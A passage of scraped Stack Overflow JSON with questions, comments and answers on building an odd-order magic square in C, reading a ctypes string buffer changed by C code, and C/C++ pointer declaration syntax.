"user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498067031, "post_id": 44682722, "comment_id": 76349867, "body": "Aside: <code>&quot;Please enter an even number&quot;</code> --&gt; <code>&quot;Please enter an odd number&quot;</code>"}, {"owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498067139, "post_id": 44682722, "comment_id": 76349928, "body": "Oh, thank you for catching that"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498067722, "post_id": 44682722, "comment_id": 76350242, "body": "Did you read the Wikipedia page <a href=\"https://en.wikipedia.org/wiki/Magic_square#Method_for_constructing_a_magic_square_of_odd_order\" rel=\"nofollow noreferrer\">Method for constructing a magic square of odd order</a>? Or the <a href=\"https://en.wikipedia.org/wiki/Siamese_method\" rel=\"nofollow noreferrer\">Siamese method</a>?"}, {"owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498067974, "post_id": 44682722, "comment_id": 76350365, "body": "Yes, I understand how it works, I was just wondering in the code where it shifts the number down instead of replacing the number already there in the array. In the case of the 3x3, the 4 shifts down instead of taking the spot of the 1"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498068274, "post_id": 44682722, "comment_id": 76350540, "body": "So it is not your code, since you don&#39;t understand it?"}, {"owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498068946, "post_id": 44682722, "comment_id": 76350923, "body": "No, it was online and I found it interesting."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498069092, "post_id": 44682722, "comment_id": 76350995, "body": "I would find it more interesting to write my own solution . . ."}, {"owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498069476, "post_id": 44682722, "comment_id": 76351222, "body": "Im just asking how it works"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498069574, "post_id": 44682722, "comment_id": 76351275, "body": "Well for a 3x3 square, you can work through the 9 positions by hand, with pencil and paper, to work out what is going on."}, {"owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498069706, "post_id": 44682722, "comment_id": 76351361, "body": "I know how the formula works, what I want to know is how they move down numbers in the program."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498069905, "post_id": 44682722, "comment_id": 76351473, "body": "...by working through the code line by line, is what I mean. If you are interested in how it works - work through it!"}, {"owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498070563, "post_id": 44682722, "comment_id": 76351898, "body": "I did I don&#39;t see where it moves the number down."}], "answers": [{"tags": [], "owner": {"reputation": 1221, "user_id": 6210312, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/kWA1n.png?s=128&g=1", "display_name": "Lacobus", "link": "https://stackoverflow.com/users/6210312/lacobus"}, "is_accepted": false, "score": 0, "last_activity_date": 1498069689, "creation_date": 1498069689, "answer_id": 44683618, "question_id": 44682722, "link": "https://stackoverflow.com/questions/44682722/magic-square-code-help-want-to-know-where-it-moves-the-number-down-programming/44683618#44683618", "title": "Magic Square Code Help, want to know where it moves the number down Programming in C", "body": "<p>What About:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define  N  (3)\n\nint main( int argc, char * argv[] )\n{\n    int square[ N ][ N ];\n\n    int i = N / 2;\n    int j = N - 1;\n    int num = 1;\n\n    memset( square, 0, sizeof(square) );\n\n    while( num &lt;= N * N )\n    {\n        if( (i == -1) &amp;&amp; (j == N) )\n        {\n            i = 0;\n            j = N - 2;\n        }\n        else\n        {\n            if( i &lt; 0 )\n                i = N - 1;\n\n            if( j == N )\n                j = 0;\n        }\n\n        if( square[i][j] )\n        {\n            i++;\n            j = j - 2;\n\n            continue;\n        }\n        else\n        {\n            square[i][j] = num;\n            num++;\n        }\n\n        j++;\n        i--;\n    }\n\n    printf(\"N   = %d\\n\", N );\n    printf(\"Sum = %d\\n\\n\", N * (N * N + 1) / 2 );\n\n    for( i = 0; i &lt; N; i++ )\n    {\n        for( j = 0; j &lt; N; j++ )\n            printf(\"%3d \", square[i][j]);\n\n        printf(\"\\n\");\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Outputs:</p>\n\n<pre><code>N   = 3\nSum = 15\n\n  2   7   6 \n  9   5   1 \n  4   3   8 \n\nN   = 5\nSum = 65\n\n  9   3  22  16  15 \n  2  21  20  14   8 \n 25  19  13   7   1 \n 18  12   6   5  24 \n 11  10   4  23  17\n\nN   = 7\nSum = 175\n\n 20  12   4  45  37  29  28 \n 11   3  44  36  35  27  19 \n  2  43  42  34  26  18  10 \n 49  41  33  25  17   9   1 \n 40  32  24  16   8   7  48 \n 31  23  15  14   6  47  39 \n 22  21  13   5  46  38  30 \n\nN   = 9\nSum = 369\n\n 35  25  15   5  76  66  56  46  45 \n 24  14   4  75  65  55  54  44  34 \n 13   3  74  64  63  53  43  33  23 \n  2  73  72  62  52  42  32  22  12 \n 81  71  61  51  41  31  21  11   1 \n 70  60  50  40  30  20  10   9  80 \n 59  49  39  29  19  18   8  79  69 \n 48  38  28  27  17   7  78  68  58 \n 37  36  26  16   6  77  67  57  47 \n</code></pre>\n\n<p>References:</p>\n\n<ol>\n<li><p><a href=\"https://en.wikipedia.org/wiki/Siamese_method\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Siamese_method</a></p></li>\n<li><p><a href=\"https://en.wikipedia.org/wiki/Magic_square\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Magic_square</a></p></li>\n</ol>\n"}], "owner": {"reputation": 1, "user_id": 8190111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eabbba9d12bc9efe3140b536a497dee1?s=128&d=identicon&r=PG&f=1", "display_name": "rprog", "link": "https://stackoverflow.com/users/8190111/rprog"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 168, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498069689, "creation_date": 1498066573, "question_id": 44682722, "link": "https://stackoverflow.com/questions/44682722/magic-square-code-help-want-to-know-where-it-moves-the-number-down-programming", "title": "Magic Square Code Help, want to know where it moves the number down Programming in C", "body": "<pre><code># include &lt;stdio.h&gt;\n# include &lt;stdlib.h&gt;\nint main(void)\n{  \nint s;\nint row;\nint column;\nint k;\nint array[99][99] ;\n\nprintf(\"Enter the dimension of the square : \") ;\nscanf(\"%d\", &amp;s) ;\n\nif (s % 2 == 0)\n{\nprintf(\"Please enter an even number\") ;\ngoto last;\n}\n\n\ncolumn = (s + 1) / 2 ;\nrow = 1 ;\n\nint sqr1 = s*s;\n\nfor(k = 1 ; k &lt;= sqr1 ; k++)\n{\narray[row][column] = k ;\nif(k % s == 0)\n{\n    row = (row + 1);\n    goto loop ;\n}\nif(row == 1)\n    row = s ;\nelse\n         row = row - 1 ;\nif(column == s)\n    column = 1;\nelse\n    column = column + 1 ;\n    loop : ;\n}\nfor (row = 1 ; row &lt;= s ; row++)\n{\nfor (column = 1 ; column &lt;= s ; column++)\n    {\n    printf(\"%d\\t\", array[row][column]) ;\n}\nprintf(\"\\n\\n\") ;\n}\nlast : ;\nreturn 0;\n}\n</code></pre>\n\n<p>I was wondering if anyone could tell me where the code puts the number down. Say I wanted a 3x3 magic square. The output would be:</p>\n\n<p><a href=\"https://i.stack.imgur.com/BYTSn.png\" rel=\"nofollow noreferrer\">https://i.stack.imgur.com/BYTSn.png</a></p>\n\n<p>I was wondering where in the code it would move the 4 down because the 1 is already there. Same thing with the 7 moving down. The principle is you go 1 up and 1 to the right everytime and if there is something there you move down and keep going.</p>\n"}, {"tags": ["python", "c", "ctypes"], "comments": [{"owner": {"reputation": 532, "user_id": 4520911, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uzPkX.png?s=128&g=1", "display_name": "iRove", "link": "https://stackoverflow.com/users/4520911/irove"}, "edited": false, "score": 0, "creation_date": 1498067862, "post_id": 44682574, "comment_id": 76350311, "body": "How exactly does <code>somefunction</code> modify its parameter <code>pythonbuffer</code>?  What did you expect to see happen?"}, {"owner": {"reputation": 321, "user_id": 1279472, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/46f1e6556176cbc7fb662a3af5b33312?s=128&d=identicon&r=PG", "display_name": "fbartolic", "link": "https://stackoverflow.com/users/1279472/fbartolic"}, "reply_to_user": {"reputation": 532, "user_id": 4520911, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uzPkX.png?s=128&g=1", "display_name": "iRove", "link": "https://stackoverflow.com/users/4520911/irove"}, "edited": false, "score": 0, "creation_date": 1498068363, "post_id": 44682574, "comment_id": 76350597, "body": "It calls another library which stores a long string in <code>pythonbuffer</code>. If I then print the content in C I get what I expect, but I can&#39;t get the same output in Python."}, {"owner": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "edited": false, "score": 1, "creation_date": 1498068847, "post_id": 44682574, "comment_id": 76350866, "body": "i guess you want <code>lib.somefunction(ctypes.POINTER(buffer))</code>"}, {"owner": {"reputation": 29355, "user_id": 205580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460e6e299e385fd46df156c85a1dd55f?s=128&d=identicon&r=PG", "display_name": "Eryk Sun", "link": "https://stackoverflow.com/users/205580/eryk-sun"}, "reply_to_user": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "edited": false, "score": 0, "creation_date": 1498072484, "post_id": 44682574, "comment_id": 76353082, "body": "@Coldspeed, <code>POINTER(buffer)</code> makes no sense, and <code>pointer(buffer)</code> would be redundant."}, {"owner": {"reputation": 321, "user_id": 1279472, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/46f1e6556176cbc7fb662a3af5b33312?s=128&d=identicon&r=PG", "display_name": "fbartolic", "link": "https://stackoverflow.com/users/1279472/fbartolic"}, "reply_to_user": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "edited": false, "score": 0, "creation_date": 1498121307, "post_id": 44682574, "comment_id": 76372142, "body": "@Coldspeed , if you look at <a href=\"https://docs.python.org/3/library/ctypes.html#passing-pointers-or-passing-parameters-by-reference\" rel=\"nofollow noreferrer\">this</a> the buffer should be passed as is."}], "answers": [{"comments": [{"owner": {"reputation": 29355, "user_id": 205580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460e6e299e385fd46df156c85a1dd55f?s=128&d=identicon&r=PG", "display_name": "Eryk Sun", "link": "https://stackoverflow.com/users/205580/eryk-sun"}, "edited": false, "score": 0, "creation_date": 1498138530, "post_id": 44696248, "comment_id": 76384726, "body": "Remember to fix <code>restype</code> to be <code>None</code> instead of returning a garbage <code>c_void_p</code> pointer."}, {"owner": {"reputation": 321, "user_id": 1279472, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/46f1e6556176cbc7fb662a3af5b33312?s=128&d=identicon&r=PG", "display_name": "fbartolic", "link": "https://stackoverflow.com/users/1279472/fbartolic"}, "reply_to_user": {"reputation": 29355, "user_id": 205580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460e6e299e385fd46df156c85a1dd55f?s=128&d=identicon&r=PG", "display_name": "Eryk Sun", "link": "https://stackoverflow.com/users/205580/eryk-sun"}, "edited": false, "score": 0, "creation_date": 1498138580, "post_id": 44696248, "comment_id": 76384761, "body": "Yep, I did that."}], "tags": [], "owner": {"reputation": 321, "user_id": 1279472, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/46f1e6556176cbc7fb662a3af5b33312?s=128&d=identicon&r=PG", "display_name": "fbartolic", "link": "https://stackoverflow.com/users/1279472/fbartolic"}, "is_accepted": false, "score": 1, "last_activity_date": 1498125895, "creation_date": 1498125895, "answer_id": 44696248, "question_id": 44682574, "link": "https://stackoverflow.com/questions/44682574/python-ctypes-how-to-read-string-modified-by-c-code/44696248#44696248", "title": "Python ctypes how to read string modified by C code", "body": "<p>Found the problem. Turns out that the code in the <code>/* do something */</code> part somehow changed the adress of <code>pythonbuffer</code>. I solved it by using a temporary <code>char *</code> and then copying it to <code>pythonbuffer</code> with <code>strcpy</code>.</p>\n"}], "owner": {"reputation": 321, "user_id": 1279472, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/46f1e6556176cbc7fb662a3af5b33312?s=128&d=identicon&r=PG", "display_name": "fbartolic", "link": "https://stackoverflow.com/users/1279472/fbartolic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 357, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498125895, "creation_date": 1498066017, "question_id": 44682574, "link": "https://stackoverflow.com/questions/44682574/python-ctypes-how-to-read-string-modified-by-c-code", "title": "Python ctypes how to read string modified by C code", "body": "<p>After following <a href=\"https://stackoverflow.com/a/6229675/1279472\">this </a> answer, I wrote a C library which I call from python using ctypes. The C library contains a function which takes a <code>char*</code> and modifies its contents. I would like to read the contents in Python, however, after calling the library function in Python, I get an empty string even though I see the correct output in the terminal if I include a  <code>printf</code> statement in the C code. What am I doing wrong? </p>\n\n<p>C code:</p>\n\n<pre><code>void somefunction(char * pythonbuffer)\n{\n    /* do something */\n    printf(\"%s\", pythonbuffer);\n}\n</code></pre>\n\n<p>Python code:</p>\n\n<pre><code>lib.somefunction.argtypes = [ctypes.c_char_p] \nlib.somefunction.restype = ctypes.c_void_p \n\nbuffer = ctypes.create_string_buffer(upper_limit)\n\nlib.somefunction(buffer)\n\nprint(buffer.value)\n</code></pre>\n\n<p>Output:\n<code>b''</code></p>\n"}, {"tags": ["c++", "c", "pointers", "syntax"], "comments": [{"owner": {"reputation": 119228, "user_id": 412080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239e18525e4c29872d85b2b553b2e4d2?s=128&d=identicon&r=PG", "display_name": "Maxim Egorushkin", "link": "https://stackoverflow.com/users/412080/maxim-egorushkin"}, "edited": false, "score": 2, "creation_date": 1498065867, "post_id": 44682501, "comment_id": 76349241, "body": "So that you can write <code>int a, *b = &amp;a</code>."}, {"owner": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": false, "score": 0, "creation_date": 1498065870, "post_id": 44682501, "comment_id": 76349243, "body": "Because the standard says so. Are you interested in the history behind this syntax decision?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 7, "creation_date": 1498065870, "post_id": 44682501, "comment_id": 76349242, "body": "How did this get +3 ??"}, {"owner": {"reputation": 1596, "user_id": 2548287, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mBqgl.png?s=128&g=1", "display_name": "Gizmo", "link": "https://stackoverflow.com/users/2548287/gizmo"}, "edited": false, "score": 0, "creation_date": 1498065886, "post_id": 44682501, "comment_id": 76349251, "body": "because the pointer somehow belongs to the variable, so it should be specified as: <code>int *left, *right, nopointer_just_int</code>"}, {"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 0, "creation_date": 1498065950, "post_id": 44682501, "comment_id": 76349283, "body": "<code>node* left, right;</code> is same as <code>node *left, *right;</code> throught first one prefered. read a book first, its basic."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 1, "creation_date": 1498065982, "post_id": 44682501, "comment_id": 76349310, "body": "@rootTraveller, can you back up that assertion?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 1, "creation_date": 1498065983, "post_id": 44682501, "comment_id": 76349311, "body": "@rootTraveller Are you sure?"}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1498065995, "post_id": 44682501, "comment_id": 76349324, "body": "Variable declaration syntax is not <code>typename varname1, varname2</code>. The type information doesn&#39;t all go in one block on the left. (Arguably, it should have; C variable declaration syntax is confusing.)"}, {"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 5, "creation_date": 1498066021, "post_id": 44682501, "comment_id": 76349342, "body": "@rootTraveller That is 100% wrong.  <code>node* left, right;</code> is the same as <code>node* left; node right;</code>"}, {"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "reply_to_user": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1498066156, "post_id": 44682501, "comment_id": 76349415, "body": "@NathanOliver I did not get it, would you share some links ?"}, {"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 1, "creation_date": 1498066231, "post_id": 44682501, "comment_id": 76349456, "body": "@rootTraveller Just look at the answers on the question this is closed as a duplicate of."}, {"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "reply_to_user": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1498066276, "post_id": 44682501, "comment_id": 76349478, "body": "@NathanOliver <code>node* left, right;</code> from here how do you guys getting this  <code>node right;</code>???"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 2, "creation_date": 1498066278, "post_id": 44682501, "comment_id": 76349479, "body": "@rootTraveller Would this link be good enough: <a href=\"https://ideone.com/sI2j2v\" rel=\"nofollow noreferrer\">ideone.com/sI2j2v</a> ?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498066308, "post_id": 44682501, "comment_id": 76349498, "body": "And the reason for spamming tags of two different languages is?"}, {"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 0, "creation_date": 1498066345, "post_id": 44682501, "comment_id": 76349516, "body": "@rootTraveller The pointer is attached to the variable name, not the type name.  In <code>node* left, right;</code> <code>right</code> is not a pointer.  That&#39;s just how pointers and references work."}, {"owner": {"reputation": 1, "user_id": 5910058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/87e1ce21ce04eb150f59eaec245d4ff8?s=128&d=identicon&r=PG&f=1", "display_name": "Jesper Juhl", "link": "https://stackoverflow.com/users/5910058/jesper-juhl"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 1, "creation_date": 1498066418, "post_id": 44682501, "comment_id": 76349555, "body": "@rootTraveller read a <a href=\"https://stackoverflow.com/questions/388242/the-definitive-c-book-guide-and-list\">good book</a> please."}, {"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498066459, "post_id": 44682501, "comment_id": 76349583, "body": "@EugeneSh. I got it."}], "answers": [{"comments": [{"owner": {"reputation": 119228, "user_id": 412080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239e18525e4c29872d85b2b553b2e4d2?s=128&d=identicon&r=PG", "display_name": "Maxim Egorushkin", "link": "https://stackoverflow.com/users/412080/maxim-egorushkin"}, "edited": false, "score": 0, "creation_date": 1498065962, "post_id": 44682543, "comment_id": 76349292, "body": "This logic breaks with <code>decltype(i) k</code>."}, {"owner": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "reply_to_user": {"reputation": 119228, "user_id": 412080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239e18525e4c29872d85b2b553b2e4d2?s=128&d=identicon&r=PG", "display_name": "Maxim Egorushkin", "link": "https://stackoverflow.com/users/412080/maxim-egorushkin"}, "edited": false, "score": 0, "creation_date": 1498066149, "post_id": 44682543, "comment_id": 76349411, "body": "@MaximEgorushkin I didn&#39;t realize the question was also tagged c++"}], "tags": [], "owner": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "is_accepted": false, "score": 0, "last_activity_date": 1498066356, "last_edit_date": 1498066356, "creation_date": 1498065903, "answer_id": 44682543, "question_id": 44682501, "link": "https://stackoverflow.com/questions/44682501/why-node-left-right-and-not-node-left-right/44682543#44682543", "title": "Why node *left,*right and not node* 